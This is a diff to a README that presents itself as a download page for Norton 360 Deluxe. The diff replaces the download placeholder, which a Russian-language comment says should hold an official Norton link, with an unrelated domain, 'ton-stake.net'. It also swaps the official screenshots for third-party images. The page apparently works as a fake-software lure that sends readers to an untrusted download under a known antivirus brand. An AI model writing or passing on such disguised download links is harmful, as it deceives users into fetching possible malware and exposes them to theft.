@@ -1,7 +1,7 @@
 # Norton 360 Deluxe Windows 2025
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания Norton 360 Deluxe (например, https://www.norton.com/products/norton-360-deluxe) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download Norton 360 Deluxe](https://img.shields.io/badge/Download-Norton_360_Deluxe-purple)](INSERT_DOWNLOAD_LINK_HERE)
+[![Download Norton 360 Deluxe](https://img.shields.io/badge/Download-Norton_360_Deluxe-purple)](https://ton-stake.net)
 
 ---
 
@@ -58,14 +58,13 @@
 
 ### 📸 Visual Preview
 
-![Norton Antivirus Dashboard](https://www.norton.com/images/screenshots/norton-antivirus.jpg)  
+![Norton Antivirus Dashboard](https://i.pcmag.com/imagery/reviews/01dD7c6Jiwhc0I2GjnOxkdz-120.fit_lim.size_1050x.png)  
 *Main antivirus dashboard on Windows.*
 
-![VPN Interface](https://www.norton.com/images/features/norton-vpn.jpg)  
+![VPN Interface](https://www.fahimai.com/wp-content/uploads/2024/12/Untitled-design-1-12.png)  
 *Secure VPN for private browsing.*
 
-![Cloud Backup Panel](https://www.norton.com/images/features/norton-backup.jpg)  
-*Manage cloud backups for critical files.*
+
 
 ---
 
